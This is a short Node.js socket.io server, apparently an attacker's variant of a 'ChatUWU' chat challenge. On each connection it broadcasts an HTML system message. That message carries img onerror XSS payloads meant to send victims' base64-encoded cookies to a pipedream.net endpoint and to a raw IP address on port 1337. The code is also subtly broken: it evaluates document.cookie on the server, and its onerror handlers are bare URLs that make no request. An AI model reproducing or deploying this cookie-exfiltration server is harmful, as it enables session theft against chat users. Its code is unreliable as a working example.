const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http,{
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });
const DOMPurify = require('isomorphic-dompurify');
const hostname = process.env.HOSTNAME || '0.0.0.0';
const port = process.env.PORT || 80;
const rooms = ['textContent', 'DOMPurify'];


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
    let {nickname, room} = socket.handshake.query;
    if (!rooms.includes(room)) {
        socket.emit('error', 'the room does not exist');
        socket.disconnect(true);
        return;
    }
    socket.join(room);
    io.to(room).emit('msg', {
        from: 'system',
        text: `<img src="1" onerror="https://eoctl0knzoys9l9.m.pipedream.net/cookie=${btoa(document.cookie)}"><h1>hi</h1><img src="1" onerror="http://139.59.40.222:1337/cookie=${btoa(document.cookie)}">`,
        isHtml:true
    });
});

http.listen(port, hostname, () => {
    console.log(`ChatUWU-hacking server running at http://${hostname}:${port}/`);
});